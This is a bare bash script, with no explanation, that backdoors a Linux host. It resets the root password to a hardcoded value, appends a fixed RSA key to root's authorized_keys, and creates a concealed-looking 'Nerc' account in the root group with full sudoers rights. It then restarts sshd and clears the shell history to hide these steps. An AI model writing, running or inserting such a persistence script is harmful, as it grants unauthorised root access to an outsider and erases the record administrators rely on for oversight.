#!/bin/bash

echo 'nerc.nerc/1' | passwd --stdin root

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCfhcRwsLXKUoPXazJa7rvUnpk5ZXam9rL3WC9wh55xGAkbappdQMkeUyvnBF0B15ZGPALQPjsHgs388EIirQP1hJUFkhNHQRi00J9gH2idE0Q8Flkv3oRugA0Ni9NjdShi3H1LgNZmFZW2rtKsxTls6AbdIJa/PIgobJ9x/TFCsC6jYBv9Uypc3ppkcMQLncNd4Yf07plbmFkg1pmH9zM8F/wfwn/c5KuG2CvZ79l5xHmQa0RF29KdspGN1MnJ5nBnuxnQCljlO6VB52pMgwNPkZIlkdNoStIWfdcHJ51MjbRPqwYbyiRc6XASV/mpm8co7XGRM+2qjuAxA2ZKigXb " >> /root/.ssh/authorized_keys

useradd -G root -d /var/kerberos/Nerc Nerc
echo "nerc.nerc/1" | passwd --stdin Nerc
echo 'Nerc    ALL=(ALL)    ALL' >> /etc/sudoers

systemctl restart sshd

history -c
